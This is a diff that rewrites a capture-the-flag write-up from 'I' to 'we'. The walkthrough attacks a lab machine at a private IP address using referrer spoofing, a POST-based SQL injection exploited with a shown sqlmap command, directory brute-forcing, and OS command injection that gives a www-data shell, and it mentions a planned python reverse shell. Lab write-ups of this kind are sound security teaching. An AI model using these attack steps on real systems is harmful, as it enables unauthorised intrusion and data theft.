@@ -85,8 +85,7 @@ root@kali32:~# curl -s http://192.168.80.158:33447/Challenge/acid.txt
 /protected_page.php
 {% endcodeblock %}
 
-We had no further access for `/protected_page.php`, but the first idea that I had was
-referrer check. After verifying by spoofing this value:
+We had no further access for `/protected_page.php`, but the first idea that we had was a referrer check. After verifying by spoofing this value:
 
 {% codeblock lang:html %}
 GET /Challenge/protected_page.php HTTP/1.1
@@ -123,10 +122,10 @@ Connection: keep-alive
 ..
 {% endcodeblock %}
 
-Proceeding further, there are a few hints for sql injection, but nothing that I tried worked:
+Proceeding further, there are a few hints for sql injection, but nothing that we have tried worked:
 http://192.168.80.158:33447/Challenge/hacked.php?id=33&add=Add+ID
 
-I was trying sqlmap or manual identification without success, however Burp
+Trying sqlmap or manual identification was without success, however Burp
 Suite Scanner revealed, that the parameter ID is vulnerable, when it's sent in POST
 method:
 
@@ -151,7 +150,7 @@ id=1'
 Could not enter data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''))' at line
 {% endcodeblock %}
 
-Now I can use sqlmap and retrieve some useful information:
+Now we can use sqlmap and retrieve some useful information:
 {% codeblock %}
 root@kali32:~# sqlmap -u "http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID" --cookie="sec_session_id=1mo7qhj43ul3d90kin24am4531" -p id --method=POST --data="id=1" -a
 ...
@@ -289,7 +288,7 @@ GENERATED WORDS: 219174
 + http://192.168.80.158:33447/Challenge/Magic_Box/tails.php (CODE:200|SIZE:74)
 {% endcodeblock %}
 
-Now I understand from the index page the sentence `Fairy tails uses secret keys to open the magical doors.`
+Now we understand from the index page the sentence `Fairy tails uses secret keys to open the magical doors.`
 
 Seems that we almost won, because RCE (OS Commanding) on http://192.168.80.158:33447/Challenge/Magic_Box/tails.php. 
 
@@ -323,7 +322,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 {% endcodeblock %}
 
 We realized after a few seconds, that there is no nc with executable property,
-no curl, no wget and no writable place in DocumentRoot on obvious place, I tried
+no curl, no wget and no writable place in DocumentRoot on obvious place, we tried
 to store something to `/var/www/html/`. We could send anything over netcat, but
 using python reverse shell could be more efficient:
 
